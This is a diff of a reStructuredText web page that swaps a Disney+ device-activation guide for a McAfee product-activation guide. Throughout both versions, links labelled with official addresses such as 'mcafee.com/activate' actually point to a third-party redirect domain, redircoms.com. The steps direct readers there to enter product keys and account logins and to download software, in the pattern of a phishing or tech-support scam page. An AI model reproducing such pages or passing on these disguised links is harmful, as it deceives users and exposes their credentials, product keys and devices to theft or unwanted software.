@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How Do I Activate My McAfee Product Using mcafee.com/activate?
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
 
 .. image:: blank.png
    :width: 350px
@@ -14,35 +14,30 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: mcafee.com/activate
+   :target: https://mc.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Activating your McAfee security software ensures full protection and access to premium features. Whether you’ve purchased a physical card or received an activation code via email, start by visiting `mcafee.com/activate <https://mc.redircoms.com>`_ to begin setup.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Activate McAfee Using Activation Code
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Open a browser and visit `mcafee.com/activate <https://mc.redircoms.com>`_.
+2. Enter your **25-digit product key** exactly as shown on your retail card or email.
+3. Log in with your **McAfee account**, or create one if you're new.
+4. Once logged in, the code will be verified and linked to your account.
+5. Follow the on-screen prompts to download and install your McAfee product.
 
 **********
-What to Do After Activation
+After Installation
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
-
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+- Launch the McAfee software from your desktop or system tray.
+- Run the initial scan to check for threats and updates.
+- Confirm that your subscription status shows as **Active**.
